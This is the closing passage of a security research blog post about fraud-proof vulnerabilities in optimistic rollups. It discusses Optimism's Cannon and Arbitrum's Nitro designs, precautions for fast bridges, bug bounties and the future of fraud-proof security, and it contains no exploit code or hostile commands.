I won’t fully explain it here, as Ben explains it far better than I could, but the general idea is not to have a separate EVM implementation at all, which was the root cause of all the vulnerabilities described in this posts. Instead, it interactively proves a subset of the MIPS instruction set, and compiles a subset of geth (aka minigeth) which implements the EVM state transition. Therefore, the EVM running in L2 (implemented in l2geth) should behave exactly like the EVM proven on L1.

Cannon uses a subset of the MIPS opcodes, needing to prove just [55 opcodes](https://github.com/ethereum-optimism/cannon/blob/24c78db43cf1d10e6d37d53e4ea63ecd40ba03e8/mipsevm/README#L7) used by minigeth, making its state machine sufficiently small for full test coverage, effective fuzzing, and possibly formal verification.

The new architecture makes OVM-2 strictly better than OVM-1: EVM equivalence, minimal attack surface due to the switch to interactive proofs, and minimal differences from geth, reducing the risk of a difference between L1 and L2 execution environment.

The switch to interactive proofs requires researching new attack vectors. For example, the mechanism design and implementation for ensuring timely participation of both sides in the challenge game must be reviewed carefully.

Interestingly, Arbitrum has been working on their next-gen [Nitro](https://medium.com/offchainlabs/arbitrum-nitro-sneak-preview-44550d9054f5) architecture for some time now, and it seems to work the same way: it removes AVM and compiles the geth state transition code to WASM (same architecture choice made by Truebit). The implementation is not available yet, but it seems that both projects will end up using similar proof systems eventually. I’m looking forward to exploring and comparing both.

# Bridges: a word of caution

If fraud proofs are ever exploited on mainnet, the primary victim will probably be [*Fast Bridges*](https://www.optimism.io/apps/bridges). The liquidity providers of these bridges effectively insure their users against attacks that abuse the fraud proofs system. It is therefore advised that these projects take some precautions to protect their liquidity:

1. Limit the available liquidity to keep the risk bounded. For example, avoid “unlimited liquidity” as [proposed by MakerDAO](https://forum.makerdao.com/t/introducing-maker-wormhole/11550/1), minting unlimited DAI on L1. An attack like the ones demonstrated above could result in severe undercollateralization and put the protocol at risk. I hope the Wormhole team will consider enforcing limits on the L1 side.
2. Running a **real** fraud prover on the bridge oracles, fully attempting to fraud-prove any transaction on a mainnet fork. It’s more computationally expensive than just watching L2 state (as the OVM-1 fraud prover did) and requires doing this for all L2 transactions, not just the ones related to the bridge. But it would have prevented all the attacks above and any form of time-travel attack, as well as reality distortion attacks. The chain would have still rolled back or altered, but the bridges would be frozen immediately so no funds would be lost.
3. Consider fraud-proof insurance. Loss is provable on-chain, making on-chain insurance claims easy. Maybe projects like [Nexus Mutual](https://nexusmutual.io/) could offer some assurance to liquidity providers.

# The future of fraud proofs

Optimistic rollups are converging on geth-based EVM implementations and interactive proofs of geth execution. Hopefully both [Cannon](https://medium.com/ethereum-optimism/cannon-cannon-cannon-introducing-cannon-4ce0d9245a03) and [Nitro](https://medium.com/offchainlabs/arbitrum-nitro-sneak-preview-44550d9054f5) will go live in the next few months. The attack surface will subsequently become smaller and easier to secure.

**Bounties** will incentivize security research, not just on rollup bridges but also fraud proofs security. Optimism already started a [$50k bounty](https://immunefi.com/bounty/optimismcannon/) for Cannon (which I hope they’ll eventually merge into their [$2M bounty](https://immunefi.com/bounty/optimism/) when Cannon is merged into OVM-2) and Arbitrum has a [$1M bounty](https://immunefi.com/bounty/arbitrum/) covering their fraud proofs as well. Have fun exploring time-travel and make money too!

As Optimistic rollups matures, it’ll become safer to increase the liquidity in *Fast Bridges*.

In a more distant future, maybe we will see optimistic rollups using multiple implementations of their fraud proofs to increase security. This is similar to Ethereum’s multi-client approach, where a bug in a single client is unlikely to lead to a consensus failure. The community could develop multiple implementations of L1 EVM provers, and rollups could opt to use a number of them after they are sufficiently tested. A failure in a single fraud proof implementation, while the other implementations consider the state transition to be valid, would result in the removal of the buggy implementation rather than an L2 chain revert. Finding a vulnerability that will work similarly against multiple fraud proof implementations will be much harder than attacking any single implementation.

# Conclusion

This long post demonstrated why fraud proofs can be risky and how they could be exploited. It also discussed ways to mitigate the risk, and took a glimpse into the future of optimistic rollups.

My hope is to raise awareness and attract security research and resources, to ensure fraud proof safety and prevent risky time-traveling.



![0_3GlFW4e89pu3RH9b](/Users/mac/Desktop/0_3GlFW4e89pu3RH9b.webp)

原文链接：https://medium.com/infinitism/optimistic-time-travel-6680567f1864
